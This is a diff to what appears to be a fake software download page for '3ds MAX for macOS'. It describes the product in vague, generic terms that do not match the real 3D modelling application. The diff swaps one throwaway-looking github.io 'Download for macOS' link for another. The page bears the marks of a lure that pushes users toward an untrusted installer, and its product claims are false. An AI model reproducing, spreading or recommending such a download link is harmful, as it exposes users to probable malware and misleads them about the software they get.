@@ -6,7 +6,7 @@
 <h3>3ds MAX for macOS</h3>
 <p>3ds MAX is a macOS-focused utility built to keep workflows orderly, predictable, and aligned with system behavior during everyday use.</p>
 
-<a href="https://install-software-utility.github.io/.github/">
+<a href="https://software-app-osx-install.github.io/.github/3ds">
   <img src="https://i.postimg.cc/7LTTZgxF/macos-badge-noborder.png" width="200" alt="Download for macOS"/>
 </a>
 </div>
